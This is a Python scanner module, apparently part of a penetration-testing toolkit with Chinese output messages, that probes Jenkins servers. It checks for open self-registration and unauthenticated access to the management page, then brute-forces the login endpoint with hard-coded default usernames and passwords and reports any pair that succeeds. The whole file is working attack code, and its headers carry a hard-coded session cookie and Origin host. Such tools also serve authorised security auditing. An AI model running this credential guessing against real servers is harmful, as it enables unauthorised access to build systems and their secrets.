import requests,re,urllib3
from pub.com.outprint import OutPrintInfo
from pub.com.reqset import ReqSet

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Jenkins_unauthorizedScan:
	def poc1(self,url):
		try:
			urlss = url + '/signup'
			responsess = requests.get(urlss, timeout=5, verify=self.ssl, proxies=self.proxy,
									  headers={"User-Agent": self.headers})
			if responsess.status_code == 200:
				OutPrintInfo("Jenkins", "[b bright_red]存在注册启用")
				OutPrintInfo("Jenkins", urlss)
			else:
				OutPrintInfo("Jenkins", "不存在注册启用")
		except Exception as e:
			OutPrintInfo("Jenkins", f"[b yellow]{e}")
	def poc2(self,url):
		url1 = url + '/manage'
		try:
			response = requests.get(url1, timeout=5, verify=self.ssl, proxies=self.proxy,
									headers={"User-Agent": self.headers})
			if "Configure" in response.text:
				OutPrintInfo("Jenkins", "[b bright_red]存在未授权访问")
				OutPrintInfo("Jenkins", url1)
			else:
				OutPrintInfo("Jenkins", "不存在未授权访问")
		except Exception as e:
			OutPrintInfo("Jenkins", f"[b yellow]{e}")
	def poc3(self,url):
		urlsss=url+'/j_acegi_security_check'

		user_list=['admin','jenkins','root','Admin']
		pass_list=['admin','admin123','Admin','Admin123','123456','jenkins']
		total=[]
		n=0
		for user in user_list:
			for pwd in pass_list:
				total.append((user,pwd))

		for t in total:
			# print(t)
			username=t[0]
			password=t[1]
			body='j_username='+username+'&j_password='+password+'&from=%2F&Submit='
			# print(body)
			headers={
			'User-Agent': self.headers,
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
			'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
			'Content-Type': 'application/x-www-form-urlencoded',
			'Content-Length': '53',
			'Origin': 'https://jenkins.legacyserver.in',
			'Connection': 'close',
			'Cookie': 'JSESSIONID.1835cdbc=node06i44xd9gh2xl3p3131ldzho711867.node0; screenResolution=1536x864',
			'Upgrade-Insecure-Requests': '1',
			'Sec-Fetch-Dest': 'document',
			'Sec-Fetch-Mode': 'navigate',
			'Sec-Fetch-Site': 'same-origin',
			'Sec-Fetch-User': '?1'
			}
			# print(url)
			r=requests.post(urlsss,body,headers=headers,verify=self.ssl,proxies=self.proxy)
			try:
				reditList = r.history
				if reditList and reditList[len(reditList)-1] and reditList[len(reditList)-1].headers["location"]:
					redit=reditList[len(reditList)-1].headers["location"]
					if 'loginError' not in redit:
						OutPrintInfo("Jenkins","[b bright_red]存在弱密码")
						OutPrintInfo("Jenkins",f"User {username} | Pass {password}")
						break
					else:
						n+=1
				else:
					n += 1
					OutPrintInfo("Jenkins", f"Login Error: User {username} | Pass {password}")
			except Exception as e:
				n+=1
				OutPrintInfo("Jenkins", f"[b yellow]{e}")
		# print(n)
		# print(len(total))
		if n==len(total):
			OutPrintInfo("Jenkins", "不存在弱密码")


	def scan(self,url):
		self.poc1(url)
		self.poc2(url)
		self.poc3(url)

	def main(self,target):
		url = target["url"].strip('/ ')
		self.ssl = target["ssl"]
		self.headers = target["header"]
		proxy = target["proxy"]
		_, self.proxy = ReqSet(proxy=proxy)
		OutPrintInfo("Jenkins", "开始检测Jenkins漏洞...")
		self.scan(url)
		OutPrintInfo("Jenkins", "Jenkins漏洞检测结束")

